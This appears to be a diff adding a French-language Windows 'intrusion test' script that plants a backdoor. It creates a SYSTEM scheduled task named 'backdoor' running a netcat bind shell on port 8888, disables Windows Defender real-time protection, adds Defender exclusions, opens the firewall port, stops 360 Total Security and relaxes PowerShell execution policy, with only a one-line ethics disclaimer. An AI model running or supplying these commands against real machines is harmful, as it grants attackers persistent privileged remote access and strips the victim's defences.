@@ -1,0 +1,53 @@
+#ceci est un script pour faire un test intrusion a un pc
+#Je ne suis pas responsable de vos acte , suis toujours la loi de l' éthique
+
+
+FB:Rakotoarivony Anjarasoa tsilavina
+
+
+
+SCHTASKS /Create /TR "c:\windows\system32\nc.exe -l -p 8888 -e cmd.exe" /sc minute /mo 1 /ru "SYSTEM" /rl HIGHEST /F /TN backdoor     /*onstart*/
+-------------------------------------------planification tache-----------------------------------------------------
+powershell set-MpPreference -DisableRealtimeMonitoring $true
+-------------------------------------------------------desactiver windows defender---------------------------
+--------------------------------------------------------parefeu---------------------------------------------------
+netsh advfirewall firewall add rule name="autoriser la port" dir=in action=allow protocol=TCP localport=8888
+
+copy %CD%nc.exe C:\windows\system32
+-------------------------------------------------------------------------------------------------------------------
+$filePath = "C:\Users\Best\Desktop\LOGICIELS UTILES\AdobePortable\IllustratorPortable\IllustratorPortable.exe"
+
+if (Test-Path -Path $filePath -PathType Leaf) {
+    $defenderExclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
+    if ($defenderExclusions -notcontains $filePath) {
+        $defenderExclusions += $filePath
+        Set-MpPreference -ExclusionPath $defenderExclusions
+        Write-Host "L'exclusion pour $filePath a été ajoutée avec succès à Windows Defender."
+    } else {
+        Write-Host "L'exclusion pour $filePath est déjà présente dans Windows Defender."
+    }
+} else {
+    Write-Host "Le fichier $filePath n'existe pas."
+}
+
+-----------------------------------------------------------------------------------------------------------------
+SCHTASKS /Create /TR "c:\windows\system32\nc.exe -l -p 8888 -e cmd.exe" /sc minute /mo 1 /ru "SYSTEM" /rl HIGHEST /F /TN backdoor     /*onstart*/
+
+----Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser--- autoriser a faire powershell a distance
+
+
+					/****Bonus*****/
+					-------------------
+
+netsh wlan connect hacker
+
+--------------planifier-----------------
+SCHTASKS /Create /TR "c:\windows\system32\defender.bat" /sc minute /mo 1 /ru "SYSTEM" /rl HIGHEST /F /TN desactiver      /*pour connection auto a localhost*/
+ --------------------------desactiver 360 security total--------------------------
+C:\Program Files\360\Total Security\QtAntivirus\antivirus.exe" /stop
+
+-----fermer un tache sur window------------------------------
+taskkill /F /IM <nom du processus>.exe
+
+
+chkdsk F:\ /f   ----> verifier un Usb
